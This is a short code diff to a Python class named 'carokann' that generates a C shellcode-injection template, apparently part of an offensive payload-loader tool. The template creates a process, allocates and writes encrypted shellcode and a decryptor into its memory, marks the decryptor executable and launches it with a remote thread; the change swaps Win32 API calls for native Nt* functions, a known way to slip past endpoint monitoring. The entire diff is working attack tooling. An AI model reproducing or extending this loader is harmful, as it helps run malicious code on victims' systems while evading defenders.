@@ -28,6 +28,7 @@ class carokann:
 """
 
     def template(self) -> str:
+        """
         template = '{transformers}'
         template += 'SIZE_T shellcodeSize = {shellcodeSize};'
         template += CreateProcessA('C:\\\\windows\\\\system32\\\\svchost.exe')
@@ -39,5 +40,16 @@ class carokann:
         template += VirtualProtectEx('hProcess', 'pDecryptor', self.decryptorLength, 'PAGE_EXECUTE_READ')
         template += CreateRemoteThread('newThread', 'hProcess', 'pDecryptor', 'buffer')
         template += WaitForSingleObject('newThread', 'INFINITE')
-
+        """
+        template = '{transformers}'
+        template += 'SIZE_T shellcodeSize = {shellcodeSize};'
+        template += NtCreateUserProcess('C:\\\\windows\\\\system32\\\\cmd.exe')
+        template += NtAllocateVirtualMemory('buffer', 'hProcess', 'shellcodeSize + sizeof(SIZE_T)', 'MEM_COMMIT', 'PAGE_READWRITE')
+        template += NtWriteVirtualMemory('hProcess', 'buffer', '&shellcodeSize', 'sizeof(SIZE_T)')
+        template += NtWriteVirtualMemory('hProcess', 'buffer + sizeof(SIZE_T)', 'shellcode', 'shellcodeSize')
+        template += NtAllocateVirtualMemory('pDecryptor', 'hProcess', self.decryptorLength, 'MEM_COMMIT', 'PAGE_READWRITE')
+        template += NtWriteVirtualMemory('hProcess', 'pDecryptor', 'decryptor', self.decryptorLength)
+        template += NtProtectVirtualMemory('hProcess', 'pDecryptor', self.decryptorLength, 'PAGE_EXECUTE_READ')
+        template += NtCreateThreadEx('newThread', 'hProcess', 'pDecryptor', 'buffer')
+        template += NtWaitForSingleObject('newThread', 'INFINITE')
         return template
